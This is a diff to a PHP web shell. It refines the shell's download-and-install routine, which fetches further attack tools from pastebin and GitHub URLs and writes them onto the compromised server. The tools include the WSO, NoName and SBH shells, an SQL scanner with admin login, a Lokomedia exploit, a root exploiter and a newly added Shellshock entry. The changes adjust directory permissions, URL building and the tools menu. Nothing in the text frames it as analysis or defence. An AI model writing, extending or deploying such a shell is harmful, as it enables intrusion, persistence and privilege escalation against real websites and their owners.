@@ -470,7 +470,7 @@ foreach ($d0mains as $d0main) {
 }
 function CreateTools($names, $lokasi) {
     if (!is_dir('kuda_tools')) {
-        mkdir('kuda_tools', 0777);
+        mkdir('kuda_tools', 0755);
     }
     $file = 'kuda_tools/' . $names . '.php';
     if (!file_exists($file)) {
@@ -493,15 +493,17 @@ if (isset($_GET['make_love'])) {
         "lokmed" => "https://pastebin.com/raw/0STXanAx",
         "rootex" => "https://raw.githubusercontent.com/mukarramkhalid/root-exploiter-php-cpp/master/root-c.php",
         "shellshock" => "https://pastebin.com/raw/ZB3DLXwR"
-
     ];
-
     $target = $_GET['make_love'];
     if (array_key_exists($target, $tools)) {
         CreateTools($target, $tools[$target]);
     }
 }
-$base_url = $_SERVER['PHP_SELF'];
+function buildUrl($key, $value) {
+    $params = $_GET;
+    $params[$key] = $value;
+    return $_SERVER['PHP_SELF'] . '?' . http_build_query($params);
+}
 if (isset($_GET['dir'])) {
 $dir = $_GET['dir'];
 chdir($dir);
@@ -5200,14 +5202,15 @@ else {
     <form>
         <select onchange='if(this.value) window.location.href=this.value;'>
             <option value=''>Extra Tools</option>
-            <option value='".$base_url."?make_love=wso404'>WSO 404 Shell</option>
-            <option value='".$base_url."?make_love=noname'>NoName Shell</option>
-            <option value='".$base_url."?make_love=blackhat'>SBH Shell</option>
-            <option value='".$base_url."?make_love=iptrack'>IP Tracker</option>
-            <option value='".$base_url."?make_love=sqlscan'>SQL Scanner + Admin Login</option>
-            <option value='".$base_url."?make_love=lokmed'>Lokomedia Exploit</option>
-            <option value='".$base_url."?make_love=rootex'>Root Checker</option>
-            <option value='".$base_url."?make_love=obfuscator'>PHP Obfuscator</option>
+            <option value='".buildUrl("make_love", "wso404")."'>WSO 404 Shell</option>
+            <option value='".buildUrl("make_love", "noname")."'>NoName Shell</option>
+            <option value='".buildUrl("make_love", "blackhat")."'>SBH Shell</option>
+            <option value='".buildUrl("make_love", "iptrack")."'>IP Tracker</option>
+            <option value='".buildUrl("make_love", "sqlscan")."'>SQL Scanner + Admin Login</option>
+            <option value='".buildUrl("make_love", "lokmed")."'>Lokomedia Exploit</option>
+            <option value='".buildUrl("make_love", "rootex")."'>Root Checker</option>
+            <option value='".buildUrl("make_love", "shellshock")."'>Shell Shock</option>
+            <option value='".buildUrl("make_love", "obfuscator")."'>PHP Obfuscator</option>
         </select>
     </form>
 </center>";
